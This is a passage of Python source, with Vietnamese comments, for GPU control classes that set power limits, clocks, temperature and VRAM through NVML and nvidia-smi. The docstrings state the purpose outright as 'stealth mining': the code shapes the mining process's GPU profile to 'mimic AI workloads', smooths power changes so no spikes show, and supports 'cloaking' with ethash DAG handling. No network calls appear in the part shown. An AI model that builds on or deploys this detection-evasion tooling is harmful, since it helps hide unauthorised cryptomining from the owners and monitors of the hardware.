    def infer_gpu_index_for_pid(self, pid: int) -> Optional[int]:
        """
        Suy luận GPU index chứa tiến trình pid (per-PID mapping – ánh xạ PID sang GPU).

        Ưu tiên NVML (pynvml), fallback dùng nvidia-smi.
        """
        try:
            if not self.gpu_initialized:
                return None

            gpu_count = self.get_gpu_count()
            for idx in range(gpu_count):
                handle = self.get_handle(idx)
                if not handle:
                    continue
                # Thử API compute trước
                try:
                    get_procs = getattr(pynvml, 'nvmlDeviceGetComputeRunningProcesses', None)
                    if get_procs is not None:
                        procs = get_procs(handle)
                        for p in procs:
                            if getattr(p, 'pid', None) == pid:
                                return idx
                except Exception:
                    pass
                # Thử API graphics nếu compute không có
                try:
                    get_gfx_procs = getattr(pynvml, 'nvmlDeviceGetGraphicsRunningProcesses', None)
                    if get_gfx_procs is not None:
                        procs = get_gfx_procs(handle)
                        for p in procs:
                            if getattr(p, 'pid', None) == pid:
                                return idx
                except Exception:
                    pass

            # Fallback: nvidia-smi
            try:
                # Map uuid -> index
                uuid_map: Dict[str, int] = {}
                out = subprocess.check_output(
                    ['nvidia-smi', '--query-gpu=index,uuid', '--format=csv,noheader'],
                    text=True
                ).strip().splitlines()
                for line in out:
                    parts = [s.strip() for s in line.split(',')]
                    if len(parts) == 2:
                        uuid_map[parts[1]] = int(parts[0])

                procs_out = subprocess.check_output(
                    ['nvidia-smi', '--query-compute-apps=pid,gpu_uuid', '--format=csv,noheader'],
                    text=True
                ).strip().splitlines()
                for line in procs_out:
                    parts = [s.strip() for s in line.split(',')]
                    if len(parts) == 2 and parts[0].isdigit() and int(parts[0]) == pid:
                        uuid = parts[1]
                        if uuid in uuid_map:
                            return uuid_map[uuid]
            except Exception:
                pass

            return None
        except Exception as e:
            self.logger.error(f"infer_gpu_index_for_pid lỗi: {e}")
            return None

    def restore_gpu_settings_for_pid(self, pid: int) -> bool:
        """
        Khôi phục lại thiết lập GPU đã thay đổi cho tiến trình pid (restore – trả về trạng thái trước đó).
        """
        try:
            saved = self.process_gpu_settings.get(pid)
            if not saved:
                self.logger.debug(f"Không có thiết lập GPU đã lưu cho PID={pid} để khôi phục.")
                return True

            for gpu_index, settings in saved.items():
                handle = self.get_handle(gpu_index)
                if not handle:
                    continue
                # Khôi phục clocks trước bằng NVML nếu có
                try:
                    pynvml.nvmlDeviceResetApplicationsClocks(handle)
                    self.logger.info(f"Đã reset application clocks cho GPU={gpu_index} (PID={pid}).")
                except Exception:
                    # Fallback: nếu có giá trị cũ thì set lại bằng nvidia-smi
                    sm_old = settings.get('sm_clock_mhz')
                    mem_old = settings.get('mem_clock_mhz')
                    if sm_old and mem_old:
                        try:
                            self.set_gpu_clocks(None, gpu_index, sm_old, mem_old)
                            self.logger.info(f"Đã khôi phục clocks GPU={gpu_index} về SM={sm_old}MHz, MEM={mem_old}MHz (PID={pid}).")
                        except Exception as e2:
                            self.logger.warning(f"Không thể khôi phục clocks GPU={gpu_index}: {e2}")

                # Khôi phục power limit nếu có
                if 'power_limit_w' in settings:
                    try:
                        self.set_gpu_power_limit(None, gpu_index, int(settings['power_limit_w']))
                        self.logger.info(f"Đã khôi phục power limit GPU={gpu_index} về {settings['power_limit_w']}W (PID={pid}).")
                    except Exception as e3:
                        self.logger.warning(f"Không thể khôi phục power limit GPU={gpu_index}: {e3}")

            # Xoá cache sau khi khôi phục
            try:
                del self.process_gpu_settings[pid]
            except Exception:
                pass

            return True
        except Exception as e:
            self.logger.error(f"restore_gpu_settings_for_pid lỗi: {e}")
            return False


###############################################################################
#                      SIMPLIFIED HARDWARE CONTROLLER                         #
###############################################################################

from .utils import CloakResult

class HardwareController:
    """
    Simple hardware controller - direct manipulation, no abstraction layers.
    Pipeline Stage 3: Nhận control params từ CloakStrategies -> Apply hardware controls.
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize hardware controller với config.
        
        :param config: Configuration dictionary
        """
        self.config = config
        self.logger = resource_logger  # Use existing logger
        
        # Initialize GPU manager
        self.gpu_manager = GPUResourceManager(config, self.logger)
        
        # GPU-only mode: NetworkResourceManager disabled
        self.network_manager = None  # type: ignore
        
        self.logger.info("[RC] HardwareController initialized - Stage 3 ready")
    
    def apply_gpu_controls(self, params: Dict[str, Any]) -> CloakResult:
        """
        Apply GPU hardware controls directly - no abstraction.
        
        :param params: Control parameters including:
            - pid: Process ID
            - gpu_index: GPU index (default 0)
            - power_limit: Power limit in Watts
            - memory_clock: Memory clock in MHz (optional)
            - sm_clock: SM clock in MHz (optional)
        :return: CloakResult với status và details
        """
        pid = params.get('pid', -1)
        gpu_index = params.get('gpu_index', 0)
        
        try:
            self.logger.info(f"[RC] Stage 3: Applying GPU controls for PID {pid}")
            
            applied_controls = []
            
            # 1. Apply power limit if specified
            if 'power_limit' in params:
                power_limit = params['power_limit']
                success = self.gpu_manager.set_gpu_power_limit(pid, gpu_index, power_limit)
                if success:
                    self.logger.info(f"[RC] ✅ Applied {power_limit}W to GPU {gpu_index}")
                    applied_controls.append(f"power_limit_{power_limit}W")
                else:
                    self.logger.error(f"[RC] ❌ Failed to set power limit")
            
            # 2. Apply clock speeds if specified
            if 'sm_clock' in params and 'memory_clock' in params:
                sm_clock = params['sm_clock']
                mem_clock = params['memory_clock']
                success = self.gpu_manager.set_gpu_clocks(pid, gpu_index, sm_clock, mem_clock)
                if success:
                    self.logger.info(f"[RC] ✅ Applied clocks: SM={sm_clock}MHz, Mem={mem_clock}MHz")
                    applied_controls.append(f"clocks_{sm_clock}_{mem_clock}MHz")
                else:
                    self.logger.warning(f"[RC] ⚠️ Could not set GPU clocks")
            
            # 3. Temperature management if threshold specified
            if 'temp_threshold' in params:
                temp_threshold = params['temp_threshold']
                fan_increase = params.get('fan_increase', 10.0)
                success = self.gpu_manager.limit_temperature(pid, gpu_index, temp_threshold, fan_increase)
                if success:
                    self.logger.info(f"[RC] ✅ Temperature management active: {temp_threshold}°C")
                    applied_controls.append(f"temp_mgmt_{temp_threshold}C")
            
            # Return success if at least one control was applied
            if applied_controls:
                return CloakResult(
                    success=True,
                    pid=pid,
                    applied_controls=applied_controls
                )
            else:
                return CloakResult(
                    success=False,
                    pid=pid,
                    error_msg="No controls were successfully applied"
                )
                
        except Exception as e:
            self.logger.error(f"[RC] Exception in apply_gpu_controls: {e}")
            return CloakResult(
                success=False,
                pid=pid,
                error_msg=str(e)
            )

###############################################################################
#                     OPTIMIZED HARDWARE CONTROLLER                          #
###############################################################################

class OptimizedHardwareController:
    """
    ✅ ENHANCED: Hardware controller tối ưu không dùng GPU plugins
    Focus on NVML và compute-based control cho stealth mining
    
    Features:
    - Temperature safety checks with emergency scaling
    - NVML-first control with compute simulation fallback
    - Dynamic VRAM management to mimic AI workloads
    - Smooth power transitions to avoid spikes
    - Baseline verification and adjustment
    """
    
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Initialize OptimizedHardwareController
        
        :param config: Configuration dict
        :param logger: Logger instance
        """
        self.logger = logger
        self.config = config
        
        # Initialize GPU manager
        self.gpu_manager = GPUResourceManager(config, logger)
        
        # Check NVML availability
        self.nvml_available = self.gpu_manager.is_nvml_initialized()
        
        # Baseline metrics
        self.baseline_power = config.get('baseline_power', 150)  # Watts
        self.baseline_temp = config.get('baseline_temp', 65)     # Celsius
        self.baseline_vram = config.get('baseline_vram', 4.0)     # GB
        
        # Safety thresholds
        self.temp_critical = config.get('temp_critical', 78)      # Critical temp
        self.temp_warning = config.get('temp_warning', 72)       # Warning temp
        self.power_max = config.get('power_max', 200)            # Max power
        
        # Profile settings
        self.profile = config.get('optimization_profile', {
            'vram_allocation': 0.5,    # 50% of available VRAM
            'power_variation': 0.15,   # ±15% power variation
            'clock_variation': 0.10,   # ±10% clock variation
            'duty_cycle': 0.85        # 85% compute duty cycle
        })
        
        # Active subprocess tracking
        self.active_subprocesses = []
        
        # Verification tracking
        self.last_verification = 0
        self.verification_interval = 30  # seconds
        # Per-PID time window (giây) để mô phỏng per-process rồi khôi phục
        self.per_pid_window_sec = config.get('per_pid_window_sec', 0)
        
        # **DAG SYNCHRONIZATION: Initialize DAG synchronizer** (đồng bộ DAG - quản lý tính toán DAG)
        self.dag_synchronizer = None
        if get_dag_synchronizer:
            try:
                self.dag_synchronizer = get_dag_synchronizer()
                self.logger.info("🔄 DAG Synchronizer initialized successfully")
            except Exception as e:
                self.logger.warning(f"⚠️ DAG Synchronizer initialization failed: {e}")
                self.dag_synchronizer = None
        else:
            self.logger.debug("🔄 DAG Synchronizer not available (module not imported)")
        
        # Mining algorithm configuration
        self.mining_config = config.get('mining_config', {
            'algorithm': 'ethash',  # Default mining algorithm
            'epoch': 450,          # Current epoch number
            'dag_size': 4.7        # DAG size in GB
        })
        
        # Feature flags via environment variables (cờ tính năng qua biến môi trường)
        self.dynamic_balancing_enabled = os.getenv('ENABLE_DYNAMIC_BALANCING', 'true').lower() == 'true'
        self.enable_dag_sync = os.getenv('ENABLE_DAG_SYNC', 'true').lower() == 'true'
        self.logger.info(f"🌐 Env flags -> ENABLE_DYNAMIC_BALANCING={self.dynamic_balancing_enabled}, ENABLE_DAG_SYNC={self.enable_dag_sync}")
        
        self.logger.info(f"✅ OptimizedHardwareController initialized (NVML: {self.nvml_available}, DAG: {self.dag_synchronizer is not None})")

        # Clean-code: cấu hình thời gian chờ DAG và helpers
        self.dag_wait_timeout_sec: int = int(self.config.get('dag_wait_timeout_sec', 60))

    def ensure_dag_ready(self, gpu_index: int) -> bool:
        """
        **DAG SYNCHRONIZATION: Ensure DAG is ready for mining** (đảm bảo DAG sẵn sàng cho mining)
        
        :param gpu_index: GPU index to use for DAG calculation
        :return: True if DAG is ready, False otherwise
        """
        if not self.dag_synchronizer:
            self.logger.debug("📊 [OHC.ensure_dag_ready] DAG synchronizer not available, skipping check")
            return True  # Continue without DAG sync if not available
        
        try:
            epoch = self.mining_config.get('epoch', 450)
            algorithm = self.mining_config.get('algorithm', 'ethash')
            
            self.logger.info(f"🔍 [OHC.ensure_dag_ready] Checking DAG for {algorithm} epoch {epoch} on GPU {gpu_index}")
            
            # Check if DAG already exists
            dag_info = self.dag_synchronizer.get_dag_info(epoch, algorithm)
            
            if dag_info and dag_info.state == DAGState.COMPLETED:
                self.logger.info(f"✅ [OHC.ensure_dag_ready] DAG already ready for {algorithm} epoch {epoch}")
                return True
            
            # Register for DAG calculation
            should_calculate = self.dag_synchronizer.register_dag_calculation(epoch, algorithm, gpu_index)
            
            if should_calculate:
                self.logger.info(f"🚀 [OHC.ensure_dag_ready] GPU {gpu_index} starting DAG calculation for {algorithm} epoch {epoch}")
                
                # Simulate DAG calculation progress
                for progress in [0.25, 0.5, 0.75, 1.0]:
                    self.dag_synchronizer.update_progress(epoch, algorithm, gpu_index, progress)
                    self.logger.debug(f"📊 [OHC.ensure_dag_ready] DAG calculation progress: {progress*100:.0f}%")
                    time.sleep(0.5)  # Simulate calculation time
                
                # Complete DAG calculation
                dag_size = int(self.mining_config.get('dag_size', 4.7) * 1024**3)  # Convert GB to bytes
                dag_hash = hashlib.sha256(f"{algorithm}_{epoch}".encode()).hexdigest()
                dag_path = f"/tmp/dag_cache/{algorithm}_epoch_{epoch}.dag"
                
                self.dag_synchronizer.complete_calculation(
                    epoch, algorithm, gpu_index, 
                    dag_path, dag_size, dag_hash
                )
                self.logger.info(f"✅ [OHC.ensure_dag_ready] DAG calculation completed for {algorithm} epoch {epoch}")
                return True
            else:
                # Another GPU is calculating, wait for completion
                self.logger.info(f"⏳ [OHC.ensure_dag_ready] Waiting for DAG calculation by another GPU...")
                
                # Dùng timeout cấu hình để clean-code và dễ điều chỉnh
                if self.dag_synchronizer.wait_for_dag(epoch, algorithm, timeout=self.dag_wait_timeout_sec):
                    self.logger.info(f"✅ [OHC.ensure_dag_ready] DAG ready after waiting")
                    return True
                else:
                    self.logger.error(f"❌ [OHC.ensure_dag_ready] DAG calculation timeout")
                    return False
                    
        except Exception as e:
            self.logger.error(f"❌ [OHC.ensure_dag_ready] Error ensuring DAG ready: {e}")
            return False  # Continue without DAG if error occurs
    
    def get_gpu_utilization_metrics(self) -> Dict[int, float]:
        """
        Get current GPU utilization metrics for all GPUs
        
        :return: Dict mapping GPU index to utilization percentage
        """
        self.logger.debug(f"📊 [OHC.get_gpu_utilization_metrics] Entry - collecting metrics for all GPUs")
        metrics = {}
        gpu_count = self.gpu_manager.get_gpu_count()
        self.logger.debug(f"🖥️ [OHC.get_gpu_utilization_metrics] Detected {gpu_count} GPU(s)")
        
        for gpu_idx in range(gpu_count):
            try:
                # Get GPU handle
                handle = self.gpu_manager.get_handle(gpu_idx)
                if not handle:
                    self.logger.warning(f"⚠️ [OHC.get_gpu_utilization_metrics] No handle for GPU {gpu_idx}")
                    metrics[gpu_idx] = 0.0
                    continue
                util = pynvml.nvmlDeviceGetUtilizationRates(handle)
                metrics[gpu_idx] = util.gpu / 100.0  # Convert to 0-1 range
            except:
                self.logger.warning(f"⚠️ [OHC.get_gpu_utilization_metrics] Error reading GPU {gpu_idx} utilization")
                metrics[gpu_idx] = 0.5  # Default medium load if can't read
        
        return metrics
    
    def allocate_gpu_workload(self, pids: List[int]) -> Dict[int, int]:
        """
        Allocate PIDs to GPUs with dynamic load balancing
        
        :param pids: List of process IDs to allocate
        :return: Dict mapping PID to GPU index
        """
        self.logger.info(f"🔄 [OHC.allocate_gpu_workload] Entry - allocating {len(pids)} PID(s): {pids}")
        allocation = {}
        
        # Get current GPU utilization
        gpu_metrics = self.get_gpu_utilization_metrics()
        if not gpu_metrics:
            # Fallback to round-robin if no metrics
            gpu_count = self.gpu_manager.get_gpu_count()
            self.logger.warning(f"⚠️ [OHC.allocate_gpu_workload] No metrics, using round-robin for {gpu_count} GPU(s)")
            for i, pid in enumerate(pids):
                allocation[pid] = i % gpu_count
                self.logger.debug(f"📌 [OHC.allocate_gpu_workload] PID {pid} → GPU {allocation[pid]} (round-robin)")
            return allocation
        
        # Sort GPUs by current load (ascending)
        sorted_gpus = sorted(gpu_metrics.items(), key=lambda x: x[1])
        
        # Assign PIDs to least loaded GPUs
        for pid in pids:
            # Get least loaded GPU
            target_gpu = sorted_gpus[0][0]
            target_load = sorted_gpus[0][1]
            
            # Assign PID to this GPU
            allocation[pid] = target_gpu
            self.logger.info(f"📊 Allocating PID {pid} to GPU {target_gpu} (current load: {target_load:.1%})")
            
            # Update estimated load
            new_load = target_load + 0.1  # Estimated load increase per PID
            sorted_gpus[0] = (target_gpu, new_load)
            
            # Re-sort to maintain order
            sorted_gpus.sort(key=lambda x: x[1])
        
        return allocation
    
    def optimize_for_pid(self, pid: int, strategy: 'StrategyType', gpu_index: int = 0) -> Dict[str, Any]:
        """
        Main optimization entry point with enhanced GPU targeting and PID-specific optimization.
        
        :param pid: Process ID to optimize for
        :param strategy: Strategy type to apply
        :param gpu_index: Specific GPU index to target (inferred if not provided)
        :return: Optimization results
        """
        # **DYNAMIC LOAD BALANCING: Auto-select GPU if not specified** (cân bằng tải động: tự động chọn GPU)
        if self.dynamic_balancing_enabled and gpu_index == 0:
            allocation = self.allocate_gpu_workload([pid])
            gpu_index = allocation.get(pid, 0)
            self.logger.info(f"🎯 Dynamic allocation: PID={pid} -> GPU={gpu_index}")
        elif not self.dynamic_balancing_enabled and gpu_index == 0:
            # Fall back to default GPU 0 when dynamic balancing is disabled (mặc định GPU 0 khi tắt cân bằng tải động)
            self.logger.info("ℹ️ Dynamic balancing disabled via ENABLE_DYNAMIC_BALANCING; defaulting to GPU 0")
            gpu_index = 0
        
        self.logger.info(f"🎯 Starting optimization for PID={pid}, Strategy={strategy}, GPU={gpu_index}")
        
        # Start timing
        start_time = time.time()
        results = {
            'success': False,
            'pid': pid,
            'strategy': strategy,
            'gpu_index': gpu_index,
            'baseline_verified': False,
            'operations_applied': [],
            'temperature_prediction': None  # **INTELLIGENCE LAYER: Temperature prediction result**
        }
        
        try:
            # **Normalize strategy for robust comparisons** (chuẩn hóa chiến lược để so sánh ổn định)
            normalized_strategy = self._normalize_strategy(strategy)
            self.logger.debug(f"🧭 [OHC.optimize_for_pid] Normalized strategy: {normalized_strategy}")

            # **DAG SYNCHRONIZATION: Ensure DAG is ready before optimization** (đảm bảo DAG sẵn sàng trước khi tối ưu)
            # PHƯƠNG ÁN A: Bật DAG sync cho cả chiến lược 'GPU' để phục vụ cloaking/stealth
            if self.enable_dag_sync and (normalized_strategy in ('mining', 'aggressive', 'gpu')):
                self.logger.info(f"🔄 [OHC.optimize_for_pid] Checking DAG readiness for mining workload")
                if not self.ensure_dag_ready(gpu_index):
                    self.logger.warning(f"⚠️ [OHC.optimize_for_pid] DAG not ready, proceeding with caution")
                    results['operations_applied'].append('dag_check_failed')
                else:
                    results['operations_applied'].append('dag_ready')
                    self.logger.info(f"✅ [OHC.optimize_for_pid] DAG is ready for mining on GPU {gpu_index}")
            elif (normalized_strategy in ('mining', 'aggressive', 'gpu')):
                self.logger.info("ℹ️ ENABLE_DAG_SYNC=false; skipping DAG readiness check")
            
            # **INTELLIGENCE LAYER: Get current power for prediction** (lấy công suất hiện tại để dự đoán)
            current_power = self.gpu_manager.get_gpu_power_usage(gpu_index)
            if current_power is None:
                current_power = 150  # Default baseline
            
            # **INTELLIGENCE LAYER: Predict temperature trajectory** (dự đoán quỹ đạo nhiệt độ)
            temp_prediction = self.gpu_manager.predict_temperature_trajectory(
                gpu_index=gpu_index,
                power_watts=current_power,
                time_horizon=60.0  # Predict 60 seconds ahead
            )
            
            results['temperature_prediction'] = temp_prediction
            
            # **Check safety status from prediction** (kiểm tra trạng thái an toàn từ dự đoán)
            if temp_prediction and 'safety_status' in temp_prediction:
                safety_status = temp_prediction['safety_status']
                
                if safety_status == 'EMERGENCY':
                    self.logger.error(f"🚨 EMERGENCY: Temperature prediction critical for GPU {gpu_index}")
                    results['operations_applied'].append('emergency_throttle')
                    # Apply emergency scaling
                    emergency_params = self._emergency_scaling({'power_limit': current_power})
                    self.apply_optimization(pid, emergency_params)
                    results['success'] = False
                    results['error'] = 'Temperature emergency - optimization aborted'
                    return results
                    
                elif safety_status == 'CRITICAL':
                    self.logger.warning(f"⚠️ CRITICAL: Adjusting strategy for temperature safety")
                    results['operations_applied'].append('safety_adjustment')
                    # Reduce power by 20%
                    adjusted_power = int(current_power * 0.8)
                    self.gpu_manager.set_gpu_power_limit(pid, gpu_index, adjusted_power)
                    
            # **Validate PID health** (xác minh sức khỏe PID)
            self.logger.debug(f"🏥 [OHC.optimize_for_pid] Validating PID {pid} health...")
            health = self.gpu_manager.validate_pid_health(pid)
            # FIX: dùng khóa 'pid_exists' thay vì 'exists' (tránh [KeyError] (lỗi truy cập khóa – ngoại lệ khi khóa không tồn tại))
            # Backward-compatible: ưu tiên 'pid_exists'; chỉ fallback sang 'exists' nếu có, không truy cập trực tiếp để tránh KeyError
            pid_exists = False
            try:
                pid_exists = bool(health.get('pid_exists', False) or health.get('exists', False))
            except Exception:
                pid_exists = False
            if not pid_exists:
                self.logger.error(f"❌ [OHC.optimize_for_pid] Process {pid} not found")
                results['error'] = f"Process {pid} not found"
                return results
            self.logger.debug(f"✅ [OHC.optimize_for_pid] PID {pid} health: score={health.get('health_score', 'N/A')}, memory={health.get('memory_percent', 'N/A')}%")
            
            # **Verify baseline** (xác minh baseline)
            if time.time() - self.last_verification > self.verification_interval:
                baseline_ok = self._verify_and_adjust_baseline(gpu_index)
                # Ghi nhận kết quả verify (true nếu đã kiểm/đồng bộ thành công)
                results['baseline_verified'] = bool(baseline_ok)
                self.last_verification = time.time()
            
            # **Apply strategy-specific optimizations** (áp dụng tối ưu hóa theo chiến lược)
            if not hasattr(self, '_get_strategy_params'):
                self.logger.error("❌ [OHC.optimize_for_pid] Missing method _get_strategy_params. Please implement strategy parameter mapper.")
                results['error'] = "Missing _get_strategy_params"
                return results
            strategy_params = self._get_strategy_params(strategy)
            self.logger.debug(f"🧩 [OHC.optimize_for_pid] Strategy params (pre-normalize): {list(strategy_params.keys())}")
            strategy_params['gpu_index'] = gpu_index
            
            # **Add temperature recommendations to params** (thêm khuyến nghị nhiệt độ)
            if temp_prediction and 'recommendations' in temp_prediction:
                strategy_params['temp_recommendations'] = temp_prediction['recommendations']
            
            # **Apply optimization** (áp dụng tối ưu hóa)
            success = self.apply_optimization(pid, strategy_params)
            results['success'] = success
            
            if success:
                results['operations_applied'].append(f'strategy_{strategy}_applied')
                self.logger.info(f"✅ Optimization successful for PID {pid}")
            else:
                self.logger.error(f"❌ Optimization failed for PID {pid}")
            
            # **Record duration** (ghi lại thời gian)
            results['duration'] = time.time() - start_time
            
        except Exception as e:
            self.logger.error(f"Optimization error for PID {pid}: {e}")
            results['error'] = str(e)
            results['success'] = False
            
        return results

    def apply_optimization(self, pid: int, params: Dict[str, Any]) -> bool:
        """
        Apply optimization với fallback strategy
        
        :param pid: Process ID to optimize
        :param params: Optimization parameters
        :return: Success status
        """
        try:
            success = True
            # Xác định GPU đích theo tham số hoặc suy luận từ PID
            gpu_index = params.get('gpu_index')
            if gpu_index is None:
                inferred = self.gpu_manager.infer_gpu_index_for_pid(pid)
                gpu_index = inferred if inferred is not None else 0
            # Cửa sổ thời gian mô phỏng per-PID (giây)
            window_sec = params.get('window_sec', self.per_pid_window_sec)
            
            # Step 1: Temperature check (CRITICAL)
            if not self._temperature_safety_check(gpu_index):
                self.logger.warning("⚠️ Temperature safety check triggered")
                params = self._emergency_scaling(params)
            
            # Step 2: Try NVML control first
            if self.nvml_available:
                self.logger.debug("Applying NVML controls...")
                normalized = self._normalize_params(params)
                self.logger.debug(f"🧪 [OHC.apply_optimization] Normalized params: {list(normalized.keys())}")
                success &= self._apply_nvml_controls(pid, gpu_index, normalized)
            else:
                # Fallback: Compute-based simulation
                self.logger.debug("NVML not available, using compute simulation...")
                normalized = self._normalize_params(params)
                self.logger.debug(f"🧪 [OHC.apply_optimization] Normalized params (compute): {list(normalized.keys())}")
                success &= self._apply_compute_simulation(gpu_index, normalized)
            
            # Step 3: VRAM management (always available)
            self.logger.debug("Managing VRAM allocation...")
            success &= self._manage_vram_allocation(gpu_index, params)
            
            # Step 4: (đã gom về nhánh verification_interval ở trên để tránh gọi trùng)

            # Step 5: Hẹn giờ khôi phục (mô phỏng per-PID theo cửa sổ thời gian)
            if window_sec and window_sec > 0:
                self._schedule_restore(pid, gpu_index, window_sec)
            
            return success
            
        except Exception as e:
            self.logger.error(f"❌ Optimization failed: {e}")
            import traceback
            self.logger.debug(traceback.format_exc())
            return False
    
    def _temperature_safety_check(self, gpu_index: int) -> bool:
        """
        Check GPU temperature for safety
        
        :return: True if safe, False if over threshold
        """
        try:
            temp = self.gpu_manager.get_gpu_temperature(gpu_index)
            if temp is None:
                self.logger.warning("Cannot read GPU temperature, assuming safe")
                return True
            
            if temp >= self.temp_critical:
                self.logger.error(f"🔥 CRITICAL: GPU temp {temp}°C >= {self.temp_critical}°C")
                return False
            elif temp >= self.temp_warning:
                self.logger.warning(f"⚠️ WARNING: GPU temp {temp}°C >= {self.temp_warning}°C")
                return True  # Still safe but needs attention
            else:
                self.logger.debug(f"✅ GPU temp {temp}°C is safe")
                return True
                
        except Exception as e:
            self.logger.error(f"Temperature check failed: {e}")
            return True  # Assume safe if can't check
    
    def _emergency_scaling(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        Scale down parameters for emergency temperature control
        
        :param params: Original parameters
        :return: Scaled parameters
        """
        self.logger.warning(f"🚨 [OHC._emergency_scaling] Entry - emergency scaling activated!")
        scaled = params.copy()
        
        # Reduce power by 30%
        if 'power_limit' in scaled:
            original_power = scaled['power_limit']
            scaled['power_limit'] = int(scaled['power_limit'] * 0.7)
            self.logger.info(f"⬇️ [OHC._emergency_scaling] Reducing power: {original_power}W → {scaled['power_limit']}W (-30%)")
        
        # Reduce clocks by 20%
        if 'sm_clock' in scaled:
            original_clock = scaled['sm_clock']
            scaled['sm_clock'] = int(scaled['sm_clock'] * 0.8)
            self.logger.info(f"⬇️ [OHC._emergency_scaling] Reducing SM clock: {original_clock}MHz → {scaled['sm_clock']}MHz (-20%)")
        
        # Add aggressive fan control
        scaled['fan_increase'] = 30.0  # 30% fan increase
        self.logger.info(f"💨 [OHC._emergency_scaling] Setting aggressive fan increase: 30%")
        
        self.logger.debug(f"✅ [OHC._emergency_scaling] Exit - scaled params: {list(scaled.keys())}")
        return scaled
    
    def _apply_nvml_controls(self, pid: int, gpu_index: int, params: Dict[str, Any]) -> bool:
        """
        Apply NVML-based controls (power, clocks)
        """
        self.logger.debug(f"⚡ [OHC._apply_nvml_controls] Entry - PID: {pid}, GPU: {gpu_index}, params: {list(params.keys())}")
        success = True
        
        try:
            # Power limit
            if 'power_limit' in params:
                power_w = params['power_limit']
                self.logger.debug(f"🔌 [OHC._apply_nvml_controls] Setting power limit to {power_w}W...")
                
                # Get current power for smooth transition
                current_power = self._get_current_power(gpu_index)
                target_power = params['power_limit']
                
                # Smooth transition if large change
                if abs(target_power - current_power) > 20:
                    self.logger.debug(f"📈 [OHC._apply_nvml_controls] Large power change ({current_power}W → {target_power}W), using step-wise...")
                    steps = 3
                    for i in range(steps):
                        intermediate = current_power + (target_power - current_power) * (i+1) / steps
                        self.logger.debug(f"  Step {i+1}/{steps}: Setting to {intermediate:.1f}W")
                        if not self.gpu_manager.set_gpu_power_limit(pid, gpu_index, int(intermediate)):
                            self.logger.warning(f"⚠️ [OHC._apply_nvml_controls] Failed at step {i+1}")
                            success = False
                            break
                        time.sleep(0.1)
                else:
                    if not self.gpu_manager.set_gpu_power_limit(pid, gpu_index, power_w):
                        self.logger.warning(f"⚠️ [OHC._apply_nvml_controls] Failed to set power limit {power_w}W")
                        success = False
                    else:
                        self.logger.info(f"✅ [OHC._apply_nvml_controls] Power limit set to {power_w}W")
            
            # Clock speeds
            if 'sm_clock' in params and 'mem_clock' in params:
                sm_mhz = params['sm_clock']
                mem_mhz = params['mem_clock']
                self.logger.debug(f"⏱️ [OHC._apply_nvml_controls] Setting clocks - SM: {sm_mhz}MHz, Mem: {mem_mhz}MHz...")
                if not self.gpu_manager.set_gpu_clocks(pid, gpu_index, sm_mhz, mem_mhz):
                    self.logger.warning(f"⚠️ [OHC._apply_nvml_controls] Failed to set clocks")
                    success = False
                else:
                    self.logger.info(f"✅ [OHC._apply_nvml_controls] Clocks set - SM: {sm_mhz}MHz, Mem: {mem_mhz}MHz")
            
            # Temperature control
            if 'temperature' in params:
                temp_target = params['temperature']
                fan_increase = (temp_target - 60) * 2  # Simple linear scaling
                self.logger.debug(f"🌡️ [OHC._apply_nvml_controls] Setting temp target: {temp_target}°C...")
                if not self.gpu_manager.limit_temperature(pid, gpu_index, temp_target, fan_increase):
                    self.logger.warning(f"⚠️ [OHC._apply_nvml_controls] Failed to set temperature limit")
                    success = False
                else:
                    self.logger.info(f"✅ [OHC._apply_nvml_controls] Temperature target set to {temp_target}°C")
            
        except Exception as e:
            self.logger.error(f"❌ [OHC._apply_nvml_controls] Exception: {e}", exc_info=True)
            success = False
        
        self.logger.debug(f"{'✅' if success else '❌'} [OHC._apply_nvml_controls] Exit - success: {success}")
        return success

    def _get_current_power(self, gpu_index: int) -> float:
        """
        Get current GPU power usage
        
        :return: Power in Watts
        """
        self.logger.debug(f"🔍 [OHC._get_current_power] Getting power for GPU {gpu_index}")
        
        try:
            gpu_handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)
            power_mw = pynvml.nvmlDeviceGetPowerUsage(gpu_handle)
            power_w = power_mw / 1000.0  # Convert to Watts
            self.logger.debug(f"✅ [OHC._get_current_power] GPU {gpu_index} power: {power_w:.1f}W")
            return power_w
        except Exception as e:
            self.logger.warning(f"⚠️ [OHC._get_current_power] Cannot read power: {e}, using baseline {self.baseline_power}W")
            return self.baseline_power

    def _normalize_strategy(self, strategy: Any) -> str:
        """
        **Normalize strategy** (chuẩn hóa chiến lược) để so sánh ổn định.
        Hỗ trợ enum/str/objects, trả về chuỗi lowercase.
        """
        try:
            if isinstance(strategy, str):
                return strategy.lower()
            value = getattr(strategy, 'value', None)
            if isinstance(value, str):
                return value.lower()
            name = getattr(strategy, 'name', None)
            if isinstance(name, str):
                return name.lower()
            return str(strategy).lower()
        except Exception:
            return 'gpu'

    def _normalize_params(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        **Parameter Normalization** (chuẩn hóa tham số – tương thích ngược)
        Map alias cũ → khóa chuẩn: memory_clock→mem_clock, temp_threshold→temperature...
        """
        try:
            normalized = dict(params) if params else {}
            if 'memory_clock' in normalized and 'mem_clock' not in normalized:
                normalized['mem_clock'] = normalized.pop('memory_clock')
            if 'temp_threshold' in normalized and 'temperature' not in normalized:
                normalized['temperature'] = normalized.pop('temp_threshold')
            if 'vram_percent' in normalized and 'vram_allocation' not in normalized:
                normalized['vram_allocation'] = normalized.pop('vram_percent')
            return normalized
        except Exception:
            return params

    def _get_strategy_params(self, strategy: Any) -> Dict[str, Any]:
        """
        **Strategy Parameter Builder** (hàm dựng tham số chiến lược)
        Trả về dict tham số theo chiến lược, dùng profile và baseline.
        """
        s = self._normalize_strategy(strategy)
        params: Dict[str, Any] = {}
        # Giá trị mặc định theo profile/baseline
        profile = self.profile or {}
        power_var = float(profile.get('power_variation', 0.15))
        clock_var = float(profile.get('clock_variation', 0.10))
        vram_alloc = float(profile.get('vram_allocation', 0.5))

        # Power mục tiêu dựa baseline
        target_power = int(max(20, min(self.power_max, self.baseline_power * (1.0 + power_var * 0.2))))

        if s in ('gpu', 'mining', 'aggressive'):
            params['power_limit'] = target_power
            # Clocks: tăng nhẹ theo biến thể profile
            try:
                handle = self.gpu_manager.get_handle(0)  # chỉ để tham chiếu clock hiện tại
                if handle:
